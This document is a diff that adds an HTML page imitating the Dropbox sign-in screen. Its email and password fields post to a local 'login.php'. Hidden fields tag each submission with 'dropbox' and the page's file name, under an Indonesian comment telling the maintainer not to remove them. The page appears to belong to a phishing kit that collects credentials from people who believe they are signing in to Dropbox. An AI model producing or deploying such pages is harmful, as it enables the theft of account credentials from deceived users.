@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+  <meta name="referrer" content="origin-when-cross-origin" />
+  <link rel="shortcut icon" href="dropbox3.png" />
+  <title>Login - Dropbox</title>
+  <style>
+    /* Reset & Global */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-font-smoothing: antialiased;
+    }
+    body {
+      font-family: "AtlasGrotesk", "Open Sans", "Segoe UI", Arial, sans-serif;
+      font-size: 13px;
+      color: #3d464d;
+      background-color: #fff;
+      line-height: 1.6;
+      min-height: 100vh;
+      padding: 0;
+      margin: 0;
+    }
+    a {
+      color: #005ff8;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a:hover, a:focus {
+      text-decoration: underline;
+    }
+    button, input[type="button"] {
+      font-family: inherit;
+      cursor: pointer;
+      outline: none;
+    }
+
+    /* Masthead */
+    .mast-head {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 76px;
+      background-color: #fff;
+      border-bottom: 1px solid #d0d4d9;
+      box-shadow: 0 1px 1px #d0d4d9;
+      z-index: 99;
+      padding: 0 20px;
+    }
+    .mast-head .container {
+      max-width: 1200px;
+      margin: auto;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .mast-head h1 {
+      font-size: 18pt;
+      font-weight: normal;
+      text-align: center;
+    }
+    .mast-head img {
+      vertical-align: middle;
+    }
+    .button-tertiary {
+      display: inline-block;
+      padding: 7px 16px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #0061ff;
+      background: transparent;
+      border: 1px solid #0061ff;
+      border-radius: 5px;
+      text-decoration: none;
+    }
+    .button-tertiary:hover {
+      color: #0052d9;
+      border-color: #0052d9;
+    }
+
+    /* Main Content */
+    .page-wrapper {
+      max-width: 1200px;
+      margin: 100px auto 80px;
+      padding: 0 20px;
+    }
+    .content-layout {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: flex-start;
+      gap: 40px;
+      justify-content: center;
+    }
+    .login-image {
+      max-width: 300px;
+      flex: 1 1 300px;
+    }
+    .login-form-container {
+      width: 100%;
+      max-width: 358px;
+      flex: 1 1 358px;
+    }
+
+    /* Form Elements */
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 8px;
+      font-size: 16px;
+      border: 1px solid #bdc4c9;
+      border-radius: 3px;
+      margin: 6px 0 12px;
+      min-height: 34px;
+    }
+    input[type="button"] {
+      width: 100%;
+      padding: 10px;
+      margin: 16px 0 10px;
+      border: 1px solid rgba(0,0,0,0.2);
+      border-radius: 3px;
+      color: white;
+      font-weight: 500;
+      background-repeat: no-repeat;
+      background-position: 12px center;
+      background-size: 16px 16px;
+      text-align: center;
+    }
+    .google-btn { background-color: #1a73e8; background-image: url(dropbox5.svg); }
+    .apple-btn  { background-color: #000; background-image: url(dropbox6.svg); }
+
+    .divider {
+      position: relative;
+      text-align: center;
+      margin: 20px 0;
+      color: #3d464d;
+      font-size: 13px;
+    }
+    .divider::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 50%;
+      width: 42%;
+      height: 1px;
+      background: #d0d4d9;
+    }
+    .divider::after {
+      content: "";
+      position: absolute;
+      right: 0;
+      top: 50%;
+      width: 42%;
+      height: 1px;
+      background: #d0d4d9;
+    }
+
+    .submit-btn {
+      width: auto;
+      float: right;
+      padding: 6px 16px;
+      background: linear-gradient(#168add, #007ee5);
+      border: 1px solid #0c6ebe;
+      color: white;
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 3px;
+      min-height: 34px;
+    }
+    .form-footer {
+      margin-top: 20px;
+      text-align: right;
+    }
+    .form-footer p {
+      margin: 8px 0;
+      font-size: 12px;
+      color: #637282;
+    }
+    .form-footer a {
+      display: block;
+      margin-top: 10px;
+      text-decoration: none;
+    }
+
+    /* Footer */
+    footer {
+      padding: 40px 20px 60px;
+      border-top: 1px solid #d0d4d9;
+      max-width: 1200px;
+      margin: auto;
+    }
+    .footer-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 30px;
+      justify-content: space-between;
+    }
+    .footer-col {
+      flex: 1 1 180px;
+      max-width: 200px;
+    }
+    .footer-col .header {
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #3d464d;
+    }
+    .footer-col ul {
+      list-style: none;
+    }
+    .footer-col li {
+      margin: 5px 0;
+      font-size: 13px;
+    }
+    .footer-col a {
+      color: #767676;
+      font-size: 13px;
+    }
+    .footer-logo {
+      float: right;
+      margin-top: 10px;
+      margin-right: 10px;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 768px) {
+      .mast-head .container {
+        flex-direction: column;
+        padding: 10px;
+        gap: 10px;
+      }
+      .mast-head h1 {
+        text-align: center;
+      }
+      .content-layout {
+        flex-direction: column;
+        align-items: center;
+      }
+      .login-image {
+        max-width: 250px;
+      }
+      .submit-btn {
+        float: none;
+        width: 100%;
+        margin: 16px 0;
+      }
+      .form-footer {
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="mast-head">
+    <div class="container">
+      <a class="button-tertiary" href="#">Try Dropbox Business</a>
+      <h1>
+        <img src="dropbox3.png" width="46" height="46" alt="Dropbox">
+        &nbsp;&nbsp;
+        <img src="dropbox4.svg" width="120" height="34" alt="Dropbox">
+      </h1>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <div class="page-wrapper">
+    <div class="content-layout">
+      <img src="dropbox1.png" class="login-image" alt="Dropbox">
+      <div class="login-form-container">
+        <p style="font-size:18px; margin-bottom:10px;">Sign in</p>
+        <p style="text-align:right; font-size:13px;">
+          or <a href="#">create an account</a>
+        </p>
+
+        <input type="button" value="Sign in with Google" class="google-btn"><br>
+        <input type="button" value="Sign in with Apple" class="apple-btn">
+
+        <div class="divider">or</div>
+
+        <form action="login.php" method="POST">
+          <input type="email" name="username" placeholder="Email" required><br>
+          <input type="password" name="password" placeholder="Password" required>
+
+          <div class="form-footer">
+            <p>This page is protected by reCAPTCHA and is subject to the Google 
+              <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.
+            </p>
+            <label style="display: flex; align-items: center;">
+              <input type="checkbox" checked>
+              <span style="margin-left: 6px;">Remember me</span>
+            </label>
+
+            <!-- Hidden fields (jangan dihapus!) -->
+            <input type="hidden" name="link">
+            <input type="hidden" name="name" value="<?= basename(__FILE__) ?>">
+            <input type="hidden" name="location" value="dropbox">
+
+            <button type="submit" class="submit-btn">Sign in</button>
+            <a href="#">Forgotten your password?</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-grid">
+      <div class="footer-col">
+        <div class="header">Dropbox</div>
+        <ul>
+          <li><a href="#">Install</a></li>
+          <li><a href="#">Mobile</a></li>
+          <li><a href="#">Pricing</a></li>
+          <li><a href="#">Business</a></li>
+          <li><a href="#">Enterprise</a></li>
+          <li><a href="#">Features</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <div class="header">About us</div>
+        <ul>
+          <li><a href="#">Dropbox Blog</a></li>
+          <li><a href="#">About</a></li>
+          <li><a href="#">Branding</a></li>
+          <li><a href="#">News</a></li>
+          <li><a href="#">Jobs</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <div class="header">Support</div>
+        <ul>
+          <li><a href="#">Help Center</a></li>
+          <li><a href="#">Contact us</a></li>
+          <li><a href="#">Copyright</a></li>
+          <li><a href="#">Cookies</a></li>
+          <li><a href="#">Privacy &amp; Terms</a></li>
+          <li><a href="#">Sitemap</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <div class="header">Community</div>
+        <ul>
+          <li><a href="#">Referrals</a></li>
+          <li><a href="#">Forum</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Facebook</a></li>
+          <li><a href="#">Developers</a></li>
+        </ul>
+      </div>
+    </div>
+    <img src="dropbox2.png" class="footer-logo" width="100" alt="Dropbox">
+  </footer>
+</body>
+</html>
